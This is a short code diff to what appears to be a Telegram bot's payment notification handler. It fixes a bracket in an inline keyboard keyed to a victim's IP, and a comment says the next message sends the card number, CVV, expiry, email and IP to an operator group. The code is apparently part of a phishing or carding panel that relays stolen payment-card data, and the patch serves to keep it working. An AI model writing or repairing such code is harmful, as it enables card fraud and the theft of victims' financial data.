@@ -1382,7 +1382,7 @@ async def payment_notify(request):
             InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
             InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
-    )
+    ]
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
 
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
